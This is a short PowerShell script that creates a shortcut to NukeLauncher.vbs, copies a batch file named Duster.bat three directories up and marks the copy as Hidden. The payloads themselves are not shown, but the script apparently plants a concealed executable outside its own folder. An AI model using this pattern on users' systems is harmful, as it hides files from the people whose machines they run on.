$file = (pwd).path
# Create a Shortcut with Windows PowerShell
$TargetFile = "$file\NukeLauncher.vbs"
$ShortcutFile = "$file\NukeLauncher.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$Shortcut.TargetPath = $TargetFile
$Shortcut.WorkingDirectory = $file
$Shortcut.Save()

$Dust = Get-childitem Duster.bat
cd ..
cd ..
cd ..
$Dust | Copy-item
$g=get-item Duster.bat -force
$g.attributes="Hidden"
exit
